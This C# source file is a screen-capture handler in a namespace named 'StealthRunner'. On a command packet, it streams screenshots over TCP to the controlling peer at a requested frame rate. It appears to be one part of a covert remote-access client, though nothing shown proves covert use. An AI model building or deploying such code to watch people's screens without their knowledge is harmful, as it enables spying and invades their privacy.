using FlexiLeaf.Core.Network;
using FlexiLeaf.Core.Network.Packets;
using System;
using System.Threading;
using System.Threading.Tasks;

namespace FlexiLeaf.StealthRunner.Handlers
{
    public static class ScreenHandlers
    {
        private static ScreenPacket ScreenPacket { get; set; } = new ScreenPacket(false, 0, 0);
        private static CancellationTokenSource cts = new();
        private static readonly object _lock = new();
        static ScreenHandlers()
        {
            Task.Run(async () =>
            {
                while (true)
                {
                    
                    while (ScreenPacket.ShowScreen && !cts.Token.IsCancellationRequested)
                    {
                        lock (_lock)
                        {
                            ScreenPacket.TakeScreen();
                            TcpClient.Instance.Send(ScreenPacket);
                        }

                    if (ScreenPacket.FrameRate > 0)
                        {
                            var delayTime = 1000 / ScreenPacket.FrameRate;
                            await Task.Delay(delayTime);
                        }
                    }

                    try
                    {
                        await Task.Delay(Timeout.Infinite, cts.Token);
                    }
                    catch (TaskCanceledException)
                    {
                    }
                }

            });
        }

        [PacketHandler]
        public static void ShowScreen(ScreenPacket packet, TcpClient Client)
        {
            lock(_lock)
            {
                if (ScreenPacket.ShowScreen != packet.ShowScreen)
                {
                    if (packet.ShowScreen)
                    {
                        cts = new CancellationTokenSource();
                    }
                    else
                    {
                        cts.Cancel();
                    }
                }
                ScreenPacket = packet;
            }
        }
    }
}
